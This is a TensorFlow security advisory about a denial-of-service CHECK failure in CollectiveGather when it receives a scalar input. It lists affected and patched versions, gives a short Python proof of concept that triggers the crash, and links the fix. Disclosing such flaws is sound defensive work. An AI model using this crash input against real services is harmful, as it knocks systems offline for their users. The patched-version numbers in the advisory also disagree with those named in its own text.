# `CHECK` fail in `CollectiveGather`

Low

[pak-laura](/pak-laura)
published
GHSA-fhfc-2q7x-929f
Sep 15, 2022

## Package

pip

tensorflow, tensorflow-cpu, tensorflow-gpu
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

< 2.10.0

## Patched versions

2.7.4, 2.8.3, 2.9.2, 2.10.0

## Description

### Impact

When `CollectiveGather` receives an scalar input `input`, it gives a `CHECK` fails that can be used to trigger a denial of service attack.

```
import tensorflow as tf
arg_0=1
arg_1=1
arg_2=1
arg_3=1
arg_4=(3, 3,3)
arg_5='auto'
arg_6=0
arg_7=''
tf.raw_ops.CollectiveGather(input=arg_0, group_size=arg_1, group_key=arg_2,
                            instance_key=arg_3, shape=arg_4,
                            communication_hint=arg_5, timeout_seconds=arg_6, name=arg_7)
```
### Patches

We have patched the issue in GitHub commit [c1f491817dec39a26be3c574e86a88c30f3c4770](https://github.com/tensorflow/tensorflow/commit/c1f491817dec39a26be3c574e86a88c30f3c4770).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.

### For more information

Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.
